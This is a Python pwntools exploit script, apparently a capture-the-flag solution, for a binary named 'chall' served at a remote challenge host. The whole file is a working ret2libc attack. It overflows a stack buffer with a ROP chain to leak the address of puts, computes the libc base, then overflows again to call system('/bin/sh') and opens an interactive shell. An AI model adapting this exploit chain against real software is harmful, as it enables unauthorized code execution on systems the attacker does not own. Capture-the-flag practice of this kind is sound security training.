#!/usr/bin/env python3

from pwn import *

exe = ELF("./chall")
libc = ELF("./libc-2.27.so")
ld = ELF("./ld-2.27.so")
rop = ROP("./chall")

context.binary = exe
context.log_level = "DEBUG"

def conn():
	if False:
		r = process([ld.path, exe.path], env={"LD_PRELOAD": libc.path})
	else:
		r = remote("challs.htsp.ro", 8001)
	return r


def main():
	r = conn()
	#gdb.attach(r, 'b main')
	r.recvuntil(b"null")
	r.sendline(b"junk")
	r.sendline(b"more junk")
	r.sendline(b"done" + b"a"*12 + p64(rop.rdi.address) + p64(exe.got['puts']) + p64(exe.symbols['puts']) + p64(exe.symbols['main']))
	r.recvline()
	leak_puts = int.from_bytes(r.recvline()[:-1],'little')
	log.info(f"Leak of puts: {hex(leak_puts)}")
	libc.address = leak_puts - libc.symbols['puts']
	log.info(f"LIBC Base Address: {hex(libc.address)}")
	log.info(f"Calculated system() address: {hex(libc.symbols['system'])}")
	r.recvuntil(b"null")
	r.sendline(b"junk")
	r.sendline(b"more junk")
	r.sendline(b"done" + b"a"*12 + p64(0x00000000004005e6) + p64(rop.rdi.address) + p64(next(libc.search(b"/bin/sh"))) + p64(libc.symbols['system']))
	r.interactive()

if __name__ == "__main__":
	main()
